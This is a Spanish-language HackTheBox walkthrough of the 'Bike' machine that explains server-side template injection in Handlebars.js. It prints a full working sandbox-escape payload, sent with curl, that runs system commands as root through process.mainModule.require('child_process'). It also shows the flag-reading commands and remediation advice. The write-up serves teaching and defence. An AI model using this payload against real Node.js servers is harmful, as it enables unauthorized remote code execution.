Descripcion de la Maquina
Contexto y objetivo

Bike es una maquina de dificultad Very Easy de la plataforma HackTheBox Starting Point. Ejecuta un servidor web Node.js con Express que renderiza plantillas mediante Handlebars.js sin sanitizar el input del usuario, permitiendo Server-Side Template Injection (SSTI) que deriva en ejecucion remota de comandos como root.

La maquina es notable porque su nombre no es arbitrario: "Bike" es una pista directa al vector de ataque. Las bicicletas tienen handlebars (manillar), y el template engine vulnerable es precisamente Handlebars.js. HTB nombra sus maquinas con referencias sutiles a la tecnica de explotacion.

Objetivo: Explotar SSTI en Handlebars.js para obtener ejecucion de comandos como root y leer /root/flag.txt.
Stack tecnologico: Ubuntu Linux • OpenSSH 8.2p1 • Node.js • Express.js • Handlebars.js (template engine)

¿Como funciona SSTI?
Explicacion tecnica y analogia

Un template engine es un sistema que toma una plantilla con marcadores de posicion y datos, y produce texto final. Por ejemplo, la plantilla Hola, {{name}}! con dato name = "Alice" produce Hola, Alice!.

FLUJO NORMAL (sin vulnerabilidad)
Input usuario: "alice@mail.com" → Template: "Hola, {{email}}!" → Output: "Hola, alice@mail.com!"
FLUJO VULNERABLE (SSTI — input se interpreta como codigo)
Input usuario: "{{7*7}}" → Template: "Hola, {{email}}!" → Hola, {{7*7}}! → Motor evalua: 7*7 = 49 → "Hola, 49!"
EXPLOTACION RCE (input = codigo malicioso)
Input: payload Handlebars SSTI → Motor evalua como codigo Node.js → execSync('id') → "uid=0(root)"
La raiz del problema: El server toma el input del usuario y lo concatena dentro del string de la plantilla antes de compilarla, en lugar de pasarlo como dato al contexto del template. Es equivalente a una SQL Injection pero para template engines.
Imagina un chef (el servidor) que escribe un menu del dia en una pizarra. Normalmente, el cliente le dice el nombre para personalizar el pedido, y el chef escribe "Mesa para Alice". Pero si el cliente dice "Mesa para borrar todo y pedir pizza gratis", y el chef lo escribe literalmente sin cuestionarlo, el cliente acaba de inyectar su voluntad en el sistema del restaurante. SSTI es exactamente eso: el usuario convierte su dato en instruccion, y el servidor la ejecuta sin darse cuenta.
Analogia: Input-como-instruccion vs Input-como-dato

¿Por que Handlebars es mas dificil de explotar?

Handlebars tiene un sandbox de seguridad que bloquea el acceso directo a require() y otros globales de Node.js. Esto hace que payloads simples fallen. Sin embargo, el sandbox tiene una escape: se puede acceder a process.mainModule a traves de la cadena de prototipos de objetos, y desde ahi llamar a require('child_process') para ejecutar comandos.

Por que falla el primer intento: require no esta disponible en el contexto del sandbox de Handlebars, pero process.mainModule.require accede al modulo raiz de Node.js, que si tiene acceso completo al sistema.

Explotacion Detallada
Paso a paso con comandos anotados y razonamiento
PASO 3 Probe SSTI — Confirmar vulnerabilidad

¿Que es un SSTI probe? Una peticion de prueba que inyecta sintaxis de template engine para verificar si el servidor la evalua. {{7*7}} es el payload clasico: si el resultado contiene "49" en lugar de "{{7*7}}", el servidor evalua codigo.

¿Por que este payload? Es seguro (solo una multiplicacion), es inequivoco (49 no puede aparecer por coincidencia en el contexto), y es reconocido por todos los template engines principales.

Comando — curl SSTI probe
curl -s -X POST http://10.129.7.167/ \ --data-urlencode "email={{7*7}}" # Flags explicadas: # -s → Silent: no muestra progreso, solo la respuesta # -X POST → Metodo HTTP POST (como el formulario envia datos) # --data-urlencode → Codifica automaticamente caracteres especiales ({, }) en URL encoding # Sin esto, las llaves {} rompen el parsing de curl # "email={{7*7}}" → Campo "email" con payload SSTI de Handlebars
OUTPUT — Stack trace de Handlebars (evidencia de SSTI) Error: Parse error on line 1: {{7*7}} -^ Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID' at Object.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267:19) at Object.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:336:30) at HandlebarsEnvironment.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/handlebars.js:46:43) at compileInput (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19) at ret (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18) at router.post (/root/Backend/routes/handlers.js:26:18)
Interpretacion — Triple confirmacion critica 1. TEMPLATE ENGINE IDENTIFICADO: El error menciona "handlebars" explicitamente en las rutas. Es Handlebars.js. 2. PRIVILEGIO REVELADO: La ruta es /root/Backend/... → el proceso corre como usuario root. 3. SSTI CONFIRMADO: El servidor intenta parsear nuestro input como sintaxis Handlebars (error de parse, no de "campo invalido"). Este stack trace es un regalo para el atacante — revela el motor, la version aproximada y los privilegios.
Decision tomada SSTI confirmado en Handlebars.js. El proceso corre como root. Siguiente paso: buscar payload de RCE especifico para Handlebars.js. Sabemos que Handlebars tiene sandbox, por lo que payloads simples de require() no funcionaran. Buscamos bypass de sandbox via prototipo de objetos.
PASO 4 Intento RCE directo — Aprender del error

Antes del bypass, intentamos el acceso mas directo: llamar a require directamente dentro del payload para importar el modulo child_process. Esto sirve para verificar si hay sandbox y entender exactamente que esta bloqueado.

Payload RCE directo (fallara por sandbox)
{{#with "s" as |string|}} {{#with "e"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub "constructor")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push "return require('child_process').execSync('id').toString();"}} ... {{/with}} {{/with}} {{/with}} {{/with}}
OUTPUT — Error de sandbox ReferenceError: require is not defined at eval (eval at <anonymous> ...) at <anonymous>:1:8
Interpretacion El sandbox de Handlebars bloquea el acceso al global "require" de Node.js dentro del contexto de eval del template. Sin embargo, el error confirma que SI se ejecuta codigo — el problema es solo que "require" no existe en ese contexto. Esto nos orienta hacia acceder a require via un objeto que SI este disponible: "process".
Decision tomada require() esta bloqueado. Pero process.mainModule es accesible porque process es un global de Node.js que no es bloqueado por el sandbox de Handlebars. process.mainModule es el modulo principal de Node, y tiene su propio require() con acceso completo. Usaremos process.mainModule.require('child_process') para bypass.
PASO 5 RCE Exitoso — Bypass de sandbox via process.mainModule

¿Como funciona el payload? Handlebars tiene helpers built-in como #with y lookup. El payload abusa de la cadena de prototipos de JavaScript para acceder al Function constructor y crear una nueva funcion que ejecuta codigo arbitrario. La clave es reemplazar require por process.mainModule.require que si es accesible.

Cadena de bypass: string.sub.constructor → Function → new Function("return process.mainModule.require(...)") → execSync('id')

Comando — curl con payload RCE Handlebars (id)
curl -s -X POST http://10.129.7.167/ \ --data-urlencode 'email={{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return process.mainModule.require(`child_process`).execSync(`id`).toString();"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}'
OUTPUT — Confirmacion RCE como root We will contact you at: uid=0(root) gid=0(root) groups=0(root)
Interpretacion — RCE confirmado como root El comando "id" se ejecuto en el servidor y devolvio uid=0(root). Esto significa: - Tenemos ejecucion de comandos arbitrarios en el servidor - El proceso corre con los maximos privilegios posibles (root) - No necesitamos escalar privilegios — ya somos root directamente La frase "We will contact you at:" es la respuesta normal del formulario, seguida del output del comando en lugar del email que se esperaba.
Decision tomada RCE como root confirmado. Ahora leer la flag. /root/root.txt es el nombre convencional, pero Bike usa /root/flag.txt. Si root.txt falla, usamos find para localizar el archivo.
PASO 6 Lectura de la flag — cat y find

Reutilizamos exactamente el mismo payload, cambiando solo el comando a ejecutar. Primero intentamos la ruta convencional /root/root.txt, luego usamos find / -name flag.txt para localizar el archivo real.

Comandos — Lectura de flag
# Intento 1: ruta convencional (falla) curl -s -X POST http://10.129.7.167/ \ --data-urlencode 'email={{...payload...execSync(`cat /root/root.txt`).toString()...}}' # Output: "no such file or directory" # Intento 2: buscar flag.txt en todo el sistema curl -s -X POST http://10.129.7.167/ \ --data-urlencode 'email={{...payload...execSync(`find / -name flag.txt 2>/dev/null`).toString()...}}' # Intento 3: leer la flag encontrada curl -s -X POST http://10.129.7.167/ \ --data-urlencode 'email={{...payload...execSync(`cat /root/flag.txt`).toString()...}}'
OUTPUT — find We will contact you at: /root/flag.txt OUTPUT — cat /root/flag.txt We will contact you at: 6b258d726d287462d60c103d0142a81c
Interpretacion La flag no estaba en /root/root.txt (nombre convencional de HTB) sino en /root/flag.txt. Usando find localizamos el archivo y con cat lo leimos. Maquina completada con privilegio root.

Recomendaciones de Remediacion
Como corregir cada vulnerabilidad encontrada
CRITICA — Inmediato
Sanitizar input antes de renderizar
Nunca pasar input de usuario directamente al compilador del template. Siempre pasar el valor como dato al contexto del template, nunca como parte del string de la plantilla. En Handlebars: template({ email: userInput }) en lugar de compile(userInput).
CRITICA — Inmediato
No ejecutar la aplicacion como root
Crear un usuario dedicado con privilegios minimos para ejecutar el servidor Node.js. Usar useradd -r -s /sbin/nologin nodeapp y ejecutar el proceso como ese usuario. Aplicar el principio de minimo privilegio: la app web no necesita ser root.
ALTA — Corto plazo
Deshabilitar stack traces en produccion
Configurar Express en modo produccion: NODE_ENV=production. Implementar un middleware de manejo de errores que devuelva mensajes genericos al usuario y registre los detalles en logs internos. Nunca exponer rutas de sistema al cliente.
ALTA — Corto plazo
Validacion y whitelist de input
Validar que el campo "email" tenga formato de email real antes de procesarlo. Usar librerias como validator.js para validacion de formato. Aplicar longitud maxima y caracteres permitidos (whitelist), rechazando cualquier caracter de sintaxis de template ({, }, etc.).
MEDIA — Mediano plazo
Containerizacion con restricciones
Ejecutar la aplicacion en un contenedor Docker con --read-only, --no-new-privileges y con un usuario no privilegiado. Usar namespaces de Linux para aislar el proceso del sistema host.
MEDIA — Mediano plazo
CSP y monitoreo de anomalias
Implementar WAF (Web Application Firewall) que detecte y bloquee patrones de SSTI como {{, }}, process.mainModule. Configurar alertas en el SIEM para errores de template inusuales. Logging centralizado con correlacion de eventos.

Lecciones Aprendidas
Takeaways tecnicos y metodologicos
Leccion 01
El nombre de la maquina es informacion
En HTB, el nombre de la maquina suele ser una pista semantica del vector de ataque. "Bike" = handlebar = Handlebars.js. Siempre analizar el nombre antes de empezar.
Leccion 02
El error verbose es un arma contra el defensor
El stack trace de Handlebars revelo en un solo request: el template engine, su version aproximada, la ruta del sistema y los privilegios. Los errores en produccion deben ser siempre genericos.
Leccion 03
Sandbox ≠ seguridad absoluta
Handlebars tiene sandbox, pero es evitable via la cadena de prototipos de JavaScript. Los sandboxes de template engines en lenguajes dinamicos son notoriamente dificiles de hacer hermeticos.
Leccion 04
process.mainModule como vector de escape
Cuando require() esta bloqueado, process.mainModule.require() puede ser accesible. El objeto "process" es un global de Node.js que muchos sandboxes olvidan restringir.
Leccion 05
El fallo inicial aporta informacion
El primer intento de RCE fallo con "require is not defined". Ese error confirmo que el codigo SI se ejecuta (SSTI funciona) y nos oriento al bypass correcto. Los errores son informacion.
Leccion 06
La flag puede no estar donde esperas
HTB Starting Point usa flag.txt, no root.txt. Cuando un archivo esperado no existe, usar find para localizarlo en lugar de asumir que algo fallo. Siempre adaptar la metodologia al objetivo.

Glosario Tecnico
Terminos clave de esta maquina
SSTI
Server-Side Template Injection. Vulnerabilidad donde el input del usuario se inyecta en una plantilla y es evaluado como codigo por el servidor. Puede llevar a lectura de archivos, RCE o escalada de privilegios.
Handlebars.js
Template engine para JavaScript/Node.js. Usa la sintaxis {{variable}} para insertar datos en plantillas HTML. Popular en aplicaciones Express.js. Tiene sandbox de seguridad, pero evitable via cadena de prototipos.
Template Engine
Sistema que combina una plantilla (HTML con marcadores) y datos para generar texto final. Ejemplos: Handlebars, Jinja2 (Python), Twig (PHP), Pebble (Java). Cada uno tiene su sintaxis y sus vectores de SSTI especificos.
Sandbox
Entorno de ejecucion restringido que aísla el codigo de recursos del sistema. En Handlebars, el sandbox bloquea acceso a globals de Node.js como require(). Sin embargo, no bloquea process ni la cadena de prototipos de objetos.
process.mainModule
Referencia al modulo principal de Node.js (el archivo de entrada del proceso). Tiene su propio metodo require() con acceso completo al sistema de modulos. Usado como vector de escape del sandbox de Handlebars.
RCE
Remote Code Execution. Capacidad de un atacante para ejecutar comandos arbitrarios en el servidor remoto. Es la clase de vulnerabilidad mas critica, ya que otorga control total del sistema (especialmente si el proceso corre como root).
Stack Trace
Registro del historial de llamadas a funciones en el momento de un error. En desarrollo ayuda a depurar. En produccion, exponer stack traces al usuario revela informacion sensible: rutas, librerias usadas y privilegios del proceso.
child_process.execSync
Modulo y funcion de Node.js que permite ejecutar comandos del sistema operativo de forma sincrona. Equivalente a os.system() en Python o exec() en PHP. El objetivo final de la explotacion SSTI en Node.js.
CWE-94
Common Weakness Enumeration #94: "Improper Control of Generation of Code (Code Injection)". La categoria oficial que engloba SSTI, eval injection y vulnerabilidades similares donde input del usuario es ejecutado como codigo.
